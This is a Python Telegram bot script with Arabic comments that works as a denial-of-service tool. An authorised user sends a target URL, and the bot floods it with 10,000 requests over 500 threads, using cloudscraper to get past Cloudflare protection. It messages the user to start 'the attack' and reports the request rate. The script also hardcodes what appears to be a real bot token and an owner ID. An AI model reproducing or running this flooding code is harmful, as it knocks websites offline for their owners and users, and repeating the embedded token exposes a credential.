import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import time

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')

def attack(url):
    try:
        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
        print("تم إرسال الطلب إلى:", url)
    except Exception as e:
        print("حدث خطأ:", e)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        url = message.text
        start_time = time.time()  # بدء المؤقت

        # زيادة عدد الخيوط
        max_workers = 500  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
        num_requests = 10000  # يمكنك أيضاً تعديل عدد الطلبات

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for _ in range(num_requests):
                executor.submit(attack, url)

        end_time = time.time()  # انتهاء المؤقت

        # حساب الزمن المستغرق
        elapsed_time = end_time - start_time

        # حساب نسبة الإرسال بالطلبات في الثانية
        requests_per_second = num_requests / elapsed_time
        bot.reply_to(message, f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")

        # استخدام session
        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
        bot.reply_to(message, response.text)
    else:
        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")

bot.polling()
